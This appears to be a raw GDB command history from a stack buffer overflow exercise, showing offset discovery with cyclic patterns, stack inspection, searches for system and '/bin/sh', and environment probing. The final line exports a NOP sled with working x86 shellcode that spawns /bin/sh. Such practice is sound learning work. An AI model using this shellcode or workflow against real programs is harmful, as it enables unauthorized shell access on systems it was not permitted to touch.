disas main
disas p
info function
run < file
run < file
pattern 300
pattern create 300 file
run < file
pattern search
run < file
function getchar
info function getchar
run < file
run < file
run < file
x/100xg $esp
run < file
run < file
pattern create 999 file
run < file
pattern search
run < file
run < file
info function getchar
run < file
run < file
run < file
run < file
run < file
print $esp
x/200xg $esp
x/100xg $esp
run < file
x/100xg $esp
x/300xg $esp
run < file
run < file
run < file
run < file
run < file
x/300xg $esp
run < file
pattern create file
pattern create 999 file
run < file
pattern create 100 file
run < file
info function getchar
run < file
patter create 100 file
pattern create 100 file
run < fil
run < file
pattern search
pattern offset AJAA
disas main
disas p
info function exit
run < file
run
run < file
run < file
run < file
run < file
x/100xg $esp
x/100xg $esp-20
x/100xg $esp-50
x/200xg $esp-50
x/50xg $esp-100
x/50xg $esp-100
x/50xg $esp-100
run < file
x/50xg $esp-100
run < file
run < file
x/50xg $esp-100
run < file
x/50xg $esp-100
run < file
run < file
x/50xg $esp-100
run < file
x/50xg $esp-100
pattern create 200 file
run < file
pattern search
pattern create 9999 file
run < file
pattern search
run < file
run < file
run < file
run < file
run < file
run < file
run < file
run < file
run < file
run < file
run < file
run < file
disas p
disas gets
disas p
disas strdup
disas p
ls
pattern create 200 file
run < file
pattern search
run < file
run < file
info function system
run < file
run < file
run < file
find __libc_start_main,+99999999,"/bin/sh"
run < file
disas main
disas p
x/100xg environ
x/100xg $environ
x/100xg *((char **)environ)
x/xs *((char **)environ)
x/xs *((char **)environ+7)
run
run < file
x/xs *((char **)environ+7)
x/xs *((char **)environ)
x/20xs *((char **)environ)
x/100xs *((char **)environ)
ls
run < file
run
kill
run
run < file
run < file
info function exit
run 
disas p
info function exit
run < file
quit
export exploit=$(python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
